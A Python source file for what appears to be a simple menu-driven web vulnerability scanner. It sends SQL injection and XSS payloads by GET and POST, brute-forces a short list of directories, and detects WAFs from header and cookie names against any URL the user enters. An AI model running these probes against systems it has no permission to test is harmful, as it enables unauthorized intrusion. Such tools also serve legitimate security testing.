import requests
import time
from urllib.parse import urljoin
from termcolor import colored

# Option 1 – SQL Injection (GET)
def test_sql_injection_get(url):
    print(colored("\n[*] Testing SQL Injection (GET)...", 'cyan'))
    payloads = ["' OR '1'='1", "' OR 1=1--", "'; WAITFOR DELAY '0:0:3'--"]

    for payload in payloads:
        try:
            test_url = f"{url}?input={payload}"
            start = time.time()
            response = requests.get(test_url, timeout=5)
            delay = time.time() - start

            if any(err in response.text.lower() for err in ["sql", "syntax", "mysql", "odbc", "unclosed", "sqlite"]) or delay > 3:
                print(colored(f"✅ VULNERABLE (GET): {payload}", 'green'))
            else:
                print(colored(f"❌ Not vulnerable (GET): {payload}", 'red'))

        except Exception as e:
            print(colored(f"[!] Error with payload '{payload}': {e}", 'red'))

# Option 2 – SQL Injection (POST)
def test_sql_injection_post(url):
    print(colored("\n[*] Testing SQL Injection (POST)...", 'cyan'))
    payloads = ["' OR '1'='1", "' OR 1=1--", "'; WAITFOR DELAY '0:0:3'--"]

    for payload in payloads:
        try:
            data = {"username": payload, "password": "any"}
            start = time.time()
            response = requests.post(url, data=data, timeout=5)
            delay = time.time() - start

            if any(err in response.text.lower() for err in ["sql", "syntax", "mysql", "odbc", "unclosed", "sqlite"]) or delay > 3:
                print(colored(f"✅ VULNERABLE (POST): {payload}", 'green'))
            else:
                print(colored(f"❌ Not vulnerable (POST): {payload}", 'red'))

        except Exception as e:
            print(colored(f"[!] Error with payload '{payload}': {e}", 'red'))

# Option 3 – XSS Testing
def test_xss(url):
    print(colored("\n[*] Testing for XSS...", 'cyan'))
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

    for payload in payloads:
        try:
            test_url = f"{url}?input={payload}"
            response = requests.get(test_url, timeout=5)

            if payload in response.text:
                print(colored(f"✅ XSS FOUND with: {payload}", 'green'))
            else:
                print(colored(f"❌ Not vulnerable to XSS with: {payload}", 'red'))

        except Exception as e:
            print(colored(f"[!] Error testing XSS payload '{payload}': {e}", 'red'))

# Option 4 – Directory Bruteforce
def dir_bruteforce(base_url):
    print(colored("\n[*] Running directory brute force...", 'cyan'))
    wordlist = ["admin", "login", "uploads", "images", "config", "backup", "db", "panel"]
    found_any = False

    for directory in wordlist:
        test_url = urljoin(base_url + "/", directory)
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                print(colored(f"✅ Found: {test_url}", 'green'))
                found_any = True
            else:
                print(colored(f"❌ Not found: {test_url}", 'red'))
        except Exception as e:
            print(colored(f"[!] Error on {test_url}: {e}", 'red'))

    if not found_any:
        print(colored("[-] No directories found.", 'yellow'))

# Option 5 – WAF Detection
def detect_waf(url):
    print(colored("\n[*] Checking for WAF (Web Application Firewall)...", 'cyan'))
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        cookies = response.cookies.get_dict()

        waf_signs = ['X-Sucuri-ID', 'cf-ray', 'X-CDN', 'X-Akamai', 'mod_security', '__cfduid', 'AWSALB']
        found = False

        for waf in waf_signs:
            if waf in headers or waf in cookies:
                print(colored(f"✅ Possible WAF detected: {waf}", 'green'))
                found = True

        if not found:
            print(colored("❌ No WAF detected.", 'red'))

    except Exception as e:
        print(colored(f"[!] Error checking WAF: {e}", 'red'))

# === MENU ===
def menu():
    print(colored("=== Web App Security Testing Tool (WASTT) ===", 'magenta'))

    while True:
        print(colored("\nSelect an option:", 'yellow'))
        print("[1] Test SQL Injection (GET)")
        print("[2] Test SQL Injection (POST)")
        print("[3] Test XSS")
        print("[4] Directory Bruteforce")
        print("[5] Detect WAF")
        print("[0] Exit")

        choice = input(colored("\n> ", 'cyan')).strip()

        if choice == '0':
            print(colored("Exiting. Happy hacking (responsibly)! 👋", 'magenta'))
            break

        url = input(colored("Enter target URL (e.g. http://example.com): ", 'cyan')).strip()

        if choice == '1':
            test_sql_injection_get(url)
        elif choice == '2':
            test_sql_injection_post(url)
        elif choice == '3':
            test_xss(url)
        elif choice == '4':
            dir_bruteforce(url)
        elif choice == '5':
            detect_waf(url)
        else:
            print(colored("[!] Invalid option. Try again.", 'red'))

if __name__ == "__main__":
    menu()

